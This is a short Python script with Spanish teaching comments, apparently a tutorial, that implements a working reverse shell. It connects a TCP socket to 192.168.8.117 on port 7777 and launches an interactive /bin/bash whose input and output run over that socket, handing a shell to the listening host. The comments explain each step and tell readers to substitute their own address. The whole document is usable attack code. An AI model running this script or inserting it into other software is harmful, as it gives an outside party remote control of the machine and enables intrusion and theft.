import socket #importamos la libreria de socket
import subprocess #E importamos subprocess y su modulo Popen
from subprocess import Popen

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#sock : es nuestra variable que va a almacenar la informacion de nuestro socket
#socket.AF_INET : es para especificar que usaremos el tipo de IPV4
#socket.SOCK_STREAM : es para especificar que usaremos el protocolo TCP/IP
shell= ['/bin/bash', '-i']
#Colocamos el tipo de shell que queremos que se mande a nuestro host
sock.connect( ('192.168.8.117', 7777) )
#Conectamos nuestro socket a la direccion y puerto asignado
#Obviamente deben utilizar ustedes su propia ip y puerto
#Recuerden que la ip debe ser un string y el puerto un int, o les lanzara un error.
sub = sock.fileno()
#Vamos a asignarle un subproceso a socket, para que no los mande a nustro host al ejecutarse
Popen(shell, stdin=sub, stdout=sub, stderr=sub )
